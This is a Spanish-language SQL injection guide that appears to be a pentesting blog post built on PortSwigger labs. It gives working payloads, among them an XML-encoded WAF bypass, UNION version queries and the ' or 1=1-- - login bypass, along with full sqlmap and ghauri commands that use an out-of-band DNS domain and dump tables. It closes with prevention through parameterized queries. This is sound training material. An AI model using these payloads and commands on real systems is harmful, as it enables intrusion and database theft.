La `SQL injection de primer orden` ocurre cuando la aplicación procesa el `input proporcionada por el usuario` a través de una `petición HTTP` e incorpora esa entrada en una `consulta SQL` de forma `insegura`

La `SQL injection de segundo orden` ocurre cuando la aplicación recibe una `entrada del usuario` mediante una `petición HTTP` y la `almacena` para utilizarla posteriormente. Esto normalmente se hace guardando la entrada en una `base de datos`, pero no se produce ninguna vulnerabilidad en el momento en que los `datos son almacenados`

Más adelante, al procesar una `petición HTTP diferente`, la aplicación recupera los `datos almacenados` y los incorpora a una `consulta SQL` de forma `insegura`

Por este motivo, la `SQL injection de segundo orden` también se conoce como `Stored SQL Injection`

La `SQL injection de segundo orden` suele producirse en situaciones en las que los `desarrolladores` son conscientes de las `vulnerabilidades de SQL injection` y, por tanto, gestionan de forma segura la `introducción inicial de los datos` en la base de datos

Cuando los datos se procesan posteriormente, se consideran `seguros` porque anteriormente fueron `almacenados en la base de datos de forma segura`

Sin embargo, en ese momento los datos se manejan de forma `insegura`, ya que el `desarrollador` los considera erróneamente `de confianza`

### SQL injection en diferentes contextos

En los laboratorios anteriores, utilizamos la `cadena de consulta` para inyectar nuestro `payload SQL malicioso`. Sin embargo, es posible realizar una `SQL injection` utilizando cualquier `entrada que podamos controlar` y que sea procesada por la aplicación como una `consulta SQL`. Por ejemplo, algunos sitios web reciben entradas en formato `JSON` o `XML` y utilizan estos datos para consultar la base de datos

Estos diferentes formatos pueden proporcionar distintas formas de `ofuscar ataques` que de otro modo, serían bloqueados por `WAFs` y otros `mecanismos de defensa`. Las `implementaciones débiles` suelen buscar `palabras clave comunes de SQL injection` dentro de la solicitud, por lo que es posible que puedas `eludir estos filtros` codificando o escapando caracteres de las `palabras clave prohibidas`. Por ejemplo, la siguiente `SQL injection basada en XML` utiliza una `secuencia de escape XML` para codificar el carácter `S` de `SELECT`:

```
<stockCheck>
<productId>123</productId>
<storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

Esto se decodificará en el `lado del servidor` antes de pasarse al `intérprete de SQL`. En este post explicamos varios formas de `ofuscar nuestro payload` [https://justice-reaper.github.io/posts/Ofuscation-Guide/](https://justice-reaper.github.io/posts/Ofuscation-Guide/)

En este `laboratorio` podemos ver un `ejemplo` de `esto`:

- SQL injection with filter bypass via XML encoding - [https://justice-reaper.github.io/posts/SQLI-Lab-18/](https://justice-reaper.github.io/posts/SQLI-Lab-18/)

## Examinar la base de datos en un ataque de SQL injection

Algunas `funciones básicas del lenguaje SQL` se implementan de la misma manera en las `plataformas de bases de datos más populares`, por lo que muchas formas de detectar y explotar `vulnerabilidades de SQL injection` funcionan de manera idéntica en `diferentes tipos de bases de datos`

Sin embargo, también existen muchas `diferencias entre las bases de datos habituales`. Esto significa que algunas técnicas para detectar y explotar `vulnerabilidades de SQL injection` funcionan de manera diferente en `distintas plataformas`. Por ejemplo:

- `Sintaxis para la concatenación de cadenas`

- `Comentarios`

- `Consultas por lotes (o apiladas)`

- `APIs específicas de la plataforma`

- `Mensajes de error`

Para explotar una `SQL injection`, a menudo es necesario obtener `información sobre la base de datos`. Esto incluye:

- El `tipo` y la `versión` del software de base de datos

- Las `tablas` y `columnas` que contiene la base de datos

### Consultar el tipo y la versión de la base de datos

Es posible identificar tanto el `tipo de base de datos` como su `versión` mediante la `inyección de consultas específicas` según la base de datos a la que nos estemos enfrentando y comprobando si alguna de ellas funciona

Las siguientes son algunas consultas que permiten determinar la `versión` de algunos de los `tipos de bases de datos más populares`:

| Tipo de base de datos       | Consulta                |
| --------------------------- | ----------------------- |
| Microsoft SQL Server, MySQL | SELECT @@version        |
| Oracle                      | SELECT * FROM v$version |
| PostgreSQL                  | SELECT version()        |

Por ejemplo, podríamos utilizar un ataque `UNION` con el siguiente `input`:

```
' UNION SELECT @@version--
```

Esto podría devolver el siguiente resultado. En este caso, podemos confirmar que la base de datos es `Microsoft SQL Server` y consultar la `versión utilizada`:

```
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64) Mar 18 2018 09:11:49 Copyright (c) Microsoft Corporation Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```

En estos `laboratorios` podemos ver un `ejemplo` de `esto`:

- SQL injection attack, querying the database type and version on Oracle - [https://justice-reaper.github.io/posts/SQLI-Lab-3/](https://justice-reaper.github.io/posts/SQLI-Lab-3/)

- SQL injection attack, querying the database type and version on MySQL and Microsoft - [https://justice-reaper.github.io/posts/SQLI-Lab-4/](https://justice-reaper.github.io/posts/SQLI-Lab-4/)

### Enumerar el contenido de la base de datos

La mayoría de los tipos de bases de datos (excepto `Oracle`) disponen de un conjunto de vistas denominado `information schema`. Estas vistas proporcionan `información sobre la estructura de la base de datos`

Por ejemplo, podemos consultar `information_schema.tables` para enumerar las `tablas existentes` en la base de datos:

```
SELECT * FROM information_schema.tables
```

Esto devuelve un `resultado similar` al siguiente:

```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```

Este resultado indica que existen `tres tablas` llamadas `Products`, `Users` y `Feedback`

A continuación, podemos consultar `information_schema.columns` para enumerar las `columnas de una tabla concreta`:

```
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

Esto devuelve un `resultado similar` al siguiente:

```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```

Este resultado muestra las `columnas de la tabla especificada` y el `tipo de datos de cada columna`

En este `laboratorio` podemos ver un `ejemplo` de `esto`:

- SQL injection attack, listing the database contents on non-Oracle databases - [https://justice-reaper.github.io/posts/SQLI-Lab-5/](https://justice-reaper.github.io/posts/SQLI-Lab-5/)

### Enumerar el contenido de una base de datos Oracle

En `Oracle`, podemos obtener la misma información pero de una `forma diferente`

Podemos enumerar las `tablas` consultando `all_tables`:

```
SELECT * FROM all_tables
```
 
Podemos `enumerar` las `columnas` consultando `all_tab_columns`:

```
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```

En este `laboratorio` podemos ver un `ejemplo` de `esto`:

- SQL injection attack, listing the database contents on Oracle - [https://justice-reaper.github.io/posts/SQLI-Lab-6/](https://justice-reaper.github.io/posts/SQLI-Lab-6/)

## Cheatsheet

Debido a que hay diferentes bases de datos y cada una tiene sus particularidades es recomendable que revisemos la `cheatsheet de portswigger` sobre SQL injection [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) para saber como se consulta el `tipo`, la `versión` y como se enumera `contenido` de cada una de las bases de datos

## Ejemplos de tipos de SQL injections

- SQL injection with filter bypass via XML encoding - [https://justice-reaper.github.io/posts/SQLI-Lab-18/](https://justice-reaper.github.io/posts/SQLI-Lab-18/) (PostgreSQL)

- Blind SQL injection with out-of-band data exfiltration - [https://justice-reaper.github.io/posts/SQLI-Lab-17/](https://justice-reaper.github.io/posts/SQLI-Lab-17/) (Oracle)

- Blind SQL injection with time delays and information retrieval - [https://justice-reaper.github.io/posts/SQLI-Lab-15/](https://justice-reaper.github.io/posts/SQLI-Lab-15/) (PostgreSQL)

- Visible error-based SQL injection - [https://justice-reaper.github.io/posts/SQLI-Lab-13/](https://justice-reaper.github.io/posts/SQLI-Lab-13/) (PostgreSQL)

- Blind SQL injection with conditional errors - [https://justice-reaper.github.io/posts/SQLI-Lab-12/](https://justice-reaper.github.io/posts/SQLI-Lab-12/) (Oracle)

- Blind SQL injection with conditional responses - [https://justice-reaper.github.io/posts/SQLI-Lab-11/](https://justice-reaper.github.io/posts/SQLI-Lab-11/) (PostgreSQL)

- SQL injection UNION attack - [https://justice-reaper.github.io/posts/SQLI-Lab-10/](https://justice-reaper.github.io/posts/SQLI-Lab-10/) (PostgreSQL) - [https://justice-reaper.github.io/posts/SQLI-Lab-6/](https://justice-reaper.github.io/posts/SQLI-Lab-6/) (Oracle) - [https://justice-reaper.github.io/posts/Validation/](https://justice-reaper.github.io/posts/Validation/) (MariaDB) - [https://justice-reaper.github.io/posts/GoodGames/](https://justice-reaper.github.io/posts/GoodGames/) (MySQL)

- SQL injection into outfile - [https://justice-reaper.github.io/posts/Validation/](https://justice-reaper.github.io/posts/Validation/) (MySQL)

- SQL injection read files - [https://justice-reaper.github.io/posts/Union/](https://justice-reaper.github.io/posts/Union/) (MySQL)

- SQL injection vulnerability allowing login bypass - [https://justice-reaper.github.io/posts/SQLI-Lab-2/](https://justice-reaper.github.io/posts/SQLI-Lab-2/)

## Cheatsheet

Usaremos estas `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:

- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)

## ¿Cómo detectar y explotar una SQL injection?

Teniendo en cuenta que `los términos y herramientas mencionados a continuación` se `encuentran` en la `cheatsheet mencionada anteriormente`, llevaremos a cabo los siguientes pasos:

1 - `Instalar` las extensiones `Hackvertor`, `Active Scan ++`, `Error Message Checks`, `Additional Scanner Checks`, `Collaborator Everywhere`, `SQLmap DNS Collaborator` y `Backslash Powered Scanner` de `Burpsuite`

2 - `Añadir` el `dominio` y sus `subdominios` al `scope`

3 - Hacer un `escaneo general` con `Burpsuite`. Como `tipo de escaneo` marcaremos `Crawl and audit` y como `configuración de escaneo` usaremos `Deep`

4 - Interactuar manualmente con todas las funcionalidades del sitio web. Una vez hecho revisamos las peticiones, las que consideremos que tinen insertion points interesantes (cookies, parámetros de consulta, datos por POST) las mandamos al Intruder, marcamos las partes que queremos escanear y hacemos click derecho > Scan defined insertion points. Cuando se nos abra el menú debemos seleccionar en `tipo de escaneo` la opción `Audit selected items`

5 - Si hay un `panel de login` podemos intentar `hacer` un `login bypass` con la típica inyección `' or 1=1-- -` antes de lanzar sqlmap, ghauri o escanear los insertion points

5 - `Analizar la query con sqlmap 2 veces`, debido a que `puede fallar en ocasiones`. Antes de lanzar sqlmap nos vamos a Burpsuite y cargamos la extensión SQLMap DNS Collaborator y nos copiamos el ese parámetro para usarlo en sqlmap. Lo primero que vamos a hacer es listar la versión con --banner, seguidamente la base de datos actual con --current-db, luego las bases de datos existentes con --dbs, posteriormente seleccionamos la base de datos que nos interese y listamos sus tablas con -D nombreBaseDeDatos --tables, lo siguiente es seleccionar la tabla que nos interese y listar sus columnas con -D nombreBaseDeDatos -T nombreTabla --columns y finalmente seleccionamos las columnas que nos interesen y dumpeamos su contenido con -D nombreBaseDeDatos -T nombreTabla -C columna1,columna2 --dump

```
sudo sqlmap -u 'https://0a050082031237258094306d00be0099.web-security-academy.net/' --cookie="TrackingId=pSWRRS0IQHT5vBjp*; session=AQlmdQgzhyO3dxWbUFsAHJCHQzDUK9ST" --risk=3 --level=5 --dns-domain=9180tced6onerv845e8zg0m8pzvpje.oastify.com --random-agent --batch --insertarParámetrosMencionadosArriba
```

6 - Mientras sqlmap está corriendo, `analizamos la query con ghauri 2 veces` para `confirmar que sqlmap no se saltó nada`. Lo primero que vamos a hacer es listar la versión con --banner, seguidamente la base de datos actual con --current-db, luego las bases de datos existentes con --dbs, posteriormente seleccionamos la base de datos que nos interese y listamos sus tablas con -D nombreBaseDeDatos --tables, lo siguiente es seleccionar la tabla que nos interese y listar sus columnas con -D nombreBaseDeDatos -T nombreTabla --columns y finalmente seleccionamos las columnas que nos interesen y dumpeamos su contenido con -D nombreBaseDeDatos -T nombreTabla -C  columna1,columna2 --dump

```
ghauri -u 'https://0a050082031237258094306d00be0099.web-security-academy.net/' --cookie="TrackingId=pSWRRS0IQHT5vBjp*; session=AQlmdQgzhyO3dxWbUFsAHJCHQzDUK9ST" --level=3 --random-agent --batch --insertarParámetrosMencionadosArriba
```

7 - Si tenemos algún problema con las queries de ghauri o de sqlmap podemos usar el parámetro --flush-session que borra todo lo descubierto y empieza de nuevo o el parámetro --fresh-queries que hace que sqlmap y ghauri recuerden el punto de inyección pero realizan las queries para listar bases de datos, tablas, columnas etc nuevamente. Es decir, si ahy problemas a la hora de etectar el punto de inyección, usamos --flush-session y si hay problema a la hora de extraer datos usamos --fresh-queries

8 - Si vemos que sqlmap o ghauri no pueden ejecutar la consulta bien pero ya hemos detectado la SQLI ya sea mediante sqlmap, ghauri o analizando los insertion points vamos a llevar a cabo la explotación manualmente. Para ayudarnos podemos usar la cheatsheet de SQLI de Portswigger [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) y los posts mencionados en esta sección de la guía [https://justice-reaper.github.io/posts/SQLI-Guide/#ejemplos-de-tipos-de-sql-injections](https://justice-reaper.github.io/posts/SQLI-Guide/#ejemplos-de-tipos-de-sql-injections). Si la SQLI que estamos explotando no se da tal cual se muestra en los posts podemos pasarle la cheathseet de SQLI de Portswigger a la IA para que nos ayude a elaborar un payload válido 

9 - Puede darse el caso en que los datos por POST se transmitan en formato XML, para estos casos es mejor hacerlo de forma manual porque es más cómodo.

## Prevenir SQL injections

Se puede `prevenir la mayoría de los casos de SQL injection` utilizando `consultas parametrizadas` en lugar de `concatenación de cadenas` dentro de la consulta. El siguiente código es `vulnerable a SQL injection` porque la `entrada del usuario` se `concatena directamente en la consulta`

```
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```

Reescribiendo el `código de manera segura`, evitamos que la `entrada del usuario interfiera con la estructura de la consulta`

```
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```

Podemos usar `consultas parametrizadas` en cualquier situación donde una `entrada no confiable` aparezca como `datos dentro de la consulta`, incluyendo la cláusula `WHERE` y los valores en una declaración `INSERT` o `UPDATE`. No podemos usarlas para manejar `entradas no confiables` en otras partes de la consulta, como `nombres de tablas o columnas` o la cláusula `ORDER BY`

La funcionalidad de la aplicación que coloca `datos no confiables` en estas partes de la consulta necesita tomar un `enfoque diferente`, por ejemplo:

- Incluir en una `whitelist` los `valores de entrada permitidos`
  
- Usar una `lógica diferente` para obtener el `comportamiento requerido`

Para que una `consulta parametrizada` sea efectiva en la `prevención de la SQL injection`, la `cadena utilizada en la consulta` siempre debe ser una `constante hardcodeada de forma fija`. Este sería un `ejemplo` de una `constante hardcodeada de forma fija`

```
consulta = "SELECT * FROM usuarios WHERE rol = 'admin'"
```

Es importante recordar que la `consulta nunca debe contener datos variables de ninguna procedencia`. Este es un ejemplo de una `entrada variable`

```
consulta = "SELECT * FROM usuarios WHERE rol = '" + rol + "'"
```

No debemos decidir caso por caso si un dato es `confiable` y seguir usando la `concatenación de cadenas con entradas variables` dentro de la consulta para casos que se consideren seguros. Debido a que es fácil `cometer errores` sobre el `posible origen de los datos` o que `cambios en otra parte del código modifiquen datos que considerábamos confiables`
